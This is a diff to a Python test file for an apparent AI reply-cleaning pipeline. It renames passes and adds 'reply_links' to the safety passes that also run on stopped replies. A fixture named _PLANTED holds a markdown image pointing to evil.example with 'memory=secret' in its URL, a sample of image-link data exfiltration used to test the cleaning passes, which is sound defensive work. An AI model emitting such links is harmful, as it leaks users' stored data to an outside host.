@@ -81,7 +81,7 @@ def test_the_passes_run_in_one_declared_order() -> None:
         "worked_again",
         "answer_labels",
         "untrusted_media",
-        "search_links",
+        "reply_links",
         "generic_closer",
         "praise_opener",
         "meta_notes",
@@ -128,7 +128,7 @@ def test_the_passes_run_in_one_declared_order() -> None:
         "requested_json",
         "recipient_placeholders",
         "prose",
-        "mermaid_and_places",
+        "chart_and_mermaid",
         "proper_case",
         "presentation",
         "clock",
@@ -396,7 +396,13 @@ _PLANTED = "Here you go.\n\n![chart](https://evil.example/c.png?memory=secret)\n
 
 def test_the_safety_passes_are_declared_and_run_on_a_stopped_reply_too() -> None:
     safety = {name for name, finalize_pass in _REAL_PASSES.items() if finalize_pass.closed}
-    assert safety == {"control_tokens", "prepare_model_reply", "untrusted_media", "prompt_leaks"}
+    assert safety == {
+        "control_tokens",
+        "prepare_model_reply",
+        "untrusted_media",
+        "reply_links",
+        "prompt_leaks",
+    }
     # What a fallback must clean, a stopped reply needs cleaned as well.
     assert safety <= STOPPED_REPLY_PASSES
 
